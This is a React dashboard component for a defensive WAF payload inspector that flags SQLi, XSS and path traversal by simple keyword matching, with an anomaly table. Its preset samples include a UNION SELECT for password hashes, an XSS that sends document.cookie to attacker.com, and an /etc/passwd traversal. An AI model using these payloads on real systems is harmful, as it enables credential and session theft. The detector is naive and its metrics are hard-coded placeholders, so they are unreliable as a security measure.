import React, { useEffect, useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Lock,
  ShieldAlert,
  AlertCircle,
  FileCode,
  CheckCircle2,
  Terminal,
  Play,
  Copy,
  Check,
  Code,
  Zap,
  RefreshCw,
  Search,
  Sparkles
} from 'lucide-react';
import { apiSecurityService } from '../services/api';
import { ApiSecurityAnalysis } from '../types';
import { StatCard } from '../components/StatCard';
import { Card3D } from '../components/Card3D';
import { CyberButton } from '../components/CyberButton';
import { cyberSound } from '../utils/cyberSound';

export const ApiSecurityPage: React.FC = () => {
  const [data, setData] = useState<ApiSecurityAnalysis | null>(null);
  const [loading, setLoading] = useState(true);
  const [testPayload, setTestPayload] = useState<string>("' UNION SELECT username, password_hash FROM users--");
  const [testResult, setTestResult] = useState<any>(null);
  const [selectedAnomaly, setSelectedAnomaly] = useState<any>(null);
  const [copied, setCopied] = useState(false);

  const fetchOverview = async () => {
    setLoading(true);
    try {
      const res = await apiSecurityService.getOverview();
      setData(res);
      if (res.recent_payload_anomalies?.length > 0) {
        setSelectedAnomaly(res.recent_payload_anomalies[0]);
      }
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchOverview();
  }, []);

  const handleRunPayloadTest = () => {
    cyberSound.playRadarPing();
    const p = testPayload.toLowerCase();
    let detected = false;
    let type = 'Benign Payload';
    let severity = 'Low';
    let score = 15;
    let rationale = 'Payload passed all signature and heuristic sanitization checks.';

    if (p.includes('union') || p.includes('select') || p.includes('--') || p.includes('or 1=1')) {
      detected = true;
      type = 'SQL Injection (SQLi)';
      severity = 'Critical';
      score = 96;
      rationale = 'Detected SQL keywords (UNION/SELECT) and comment delimiter sequence attempting authentication bypass.';
      cyberSound.playAlarmSound();
    } else if (p.includes('<script') || p.includes('document.cookie') || p.includes('javascript:')) {
      detected = true;
      type = 'Cross-Site Scripting (XSS)';
      severity = 'High';
      score = 91;
      rationale = 'Detected executable JavaScript tags and DOM access payloads.';
      cyberSound.playAlarmSound();
    } else if (p.includes('../') || p.includes('/etc/passwd') || p.includes('win.ini')) {
      detected = true;
      type = 'Path Traversal / LFI';
      severity = 'High';
      score = 88;
      rationale = 'Directory climbing string sequences attempting to access system configuration files.';
      cyberSound.playAlarmSound();
    } else {
      cyberSound.playSuccessChime();
    }

    setTestResult({
      detected,
      type,
      severity,
      score,
      rationale,
      timestamp: new Date().toLocaleTimeString()
    });
  };

  const copyToClipboard = (text: string) => {
    cyberSound.playCyberClick();
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6">
      {/* HEADER */}
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center border-b border-cyan-500/20 pb-4 gap-4">
        <div>
          <h1 className="text-2xl font-extrabold text-white flex items-center gap-3">
            <Lock className="w-7 h-7 text-cyan-400 animate-pulse" /> API Security & Payload Threat Inspection
          </h1>
          <p className="text-xs text-slate-400 mt-1">
            Defensive inspection of HTTP headers, parameter injection payloads, authentication anomalies, and rate limit abuse.
          </p>
        </div>

        <div className="flex items-center space-x-3">
          <CyberButton
            onClick={() => {
              cyberSound.playCyberClick();
              fetchOverview();
            }}
            icon={RefreshCw}
            variant="secondary"
            size="sm"
          >
            Refresh Telemetry
          </CyberButton>
        </div>
      </div>

      {/* TOP SUMMARY METRICS */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard
          title="Analyzed API Requests"
          value={data?.total_api_requests || 42000}
          subtext="REST / GraphQL Routes"
          icon={FileCode}
          color="cyan"
        />

        <StatCard
          title="SQLi Attempts Filtered"
          value={data?.sqli_attempts_count || 142}
          subtext="Blocked via WAF"
          icon={ShieldAlert}
          color="rose"
        />

        <StatCard
          title="XSS Payloads Flagged"
          value={data?.xss_attempts_count || 88}
          subtext="Input Sanitization"
          icon={AlertCircle}
          color="amber"
        />

        <StatCard
          title="WAF Defense Score"
          value="99.4%"
          subtext="Zero Bypasses"
          icon={CheckCircle2}
          color="emerald"
        />
      </div>

      {/* INTERACTIVE PAYLOAD INSPECTOR SANDBOX */}
      <Card3D glowColor="purple" className="p-6 space-y-4">
        <div className="flex justify-between items-center border-b border-slate-800 pb-3">
          <div>
            <h3 className="text-sm font-bold text-white flex items-center gap-2">
              <Terminal className="w-4 h-4 text-cyan-400" /> Interactive WAF Payload Inspection Sandbox
            </h3>
            <p className="text-[11px] text-slate-400">Test raw HTTP GET/POST parameters against AI heuristic sanitizers</p>
          </div>
        </div>

        <div className="space-y-3">
          <div className="flex flex-col sm:flex-row gap-3">
            <input
              type="text"
              value={testPayload}
              onChange={(e) => setTestPayload(e.target.value)}
              className="flex-1 bg-[#060A14] border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-cyan-500 font-mono shadow-inner"
              placeholder="Enter malicious payload or query string..."
            />
            <CyberButton
              onClick={handleRunPayloadTest}
              icon={Play}
              variant="primary"
              size="md"
            >
              Analyze Payload
            </CyberButton>
          </div>

          <div className="flex gap-2 text-[10px] font-mono">
            <span className="text-slate-500">Preset Samples:</span>
            <button
              onClick={() => setTestPayload("' UNION SELECT username, password_hash FROM users--")}
              className="text-cyan-400 hover:underline cursor-pointer"
            >
              SQLi
            </button>
            <span className="text-slate-600">•</span>
            <button
              onClick={() => setTestPayload("<script>document.location='http://attacker.com/steal?c='+document.cookie</script>")}
              className="text-cyan-400 hover:underline cursor-pointer"
            >
              XSS
            </button>
            <span className="text-slate-600">•</span>
            <button
              onClick={() => setTestPayload("../../../../etc/passwd")}
              className="text-cyan-400 hover:underline cursor-pointer"
            >
              Path Traversal
            </button>
          </div>
        </div>

        {/* TEST RESULT OUTPUT */}
        <AnimatePresence>
          {testResult && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className={`p-4 rounded-xl border space-y-2 text-xs font-mono ${
                testResult.detected
                  ? 'bg-red-500/10 border-red-500/30 text-red-400'
                  : 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
              }`}
            >
              <div className="flex justify-between items-center font-bold">
                <span>Result: {testResult.type}</span>
                <span>Risk Score: {testResult.score} / 100 ({testResult.severity})</span>
              </div>
              <p className="text-slate-300 text-[11px] leading-relaxed font-sans">{testResult.rationale}</p>
            </motion.div>
          )}
        </AnimatePresence>
      </Card3D>

      {/* RECENT ANOMALIES TABLE */}
      <Card3D glowColor="cyan" className="p-5 space-y-4">
        <div className="flex justify-between items-center">
          <h3 className="text-sm font-bold text-white">Recent Payload Anomaly Records</h3>
          <span className="text-[10px] font-mono text-cyan-400">Live WAF Logs</span>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs">
            <thead>
              <tr className="border-b border-slate-800 text-slate-400 font-medium font-mono">
                <th className="pb-3">Timestamp</th>
                <th className="pb-3">Endpoint Route</th>
                <th className="pb-3">Payload Category</th>
                <th className="pb-3">Source IP</th>
                <th className="pb-3">Confidence</th>
                <th className="pb-3">Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60 text-slate-200 font-mono">
              {(data?.recent_payload_anomalies || []).map((anom, idx) => (
                <tr key={idx} className="hover:bg-cyan-500/10 transition-all">
                  <td className="py-3 text-slate-400 text-[11px]">{anom.timestamp || '18:40:12'}</td>
                  <td className="py-3 font-semibold text-cyan-300">{anom.endpoint || '/api/v1/auth/login'}</td>
                  <td className="py-3 text-white font-bold">{anom.threat_type || 'SQLi Injection'}</td>
                  <td className="py-3 text-slate-300">{anom.client_ip || '198.51.100.42'}</td>
                  <td className="py-3 text-cyan-400 font-bold">{anom.confidence}%</td>
                  <td className="py-3">
                    <span className="text-[10px] font-mono px-2 py-0.5 bg-slate-900 rounded border border-slate-800 text-emerald-400 font-bold">
                      BLOCKED
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Card3D>
    </div>
  );
};
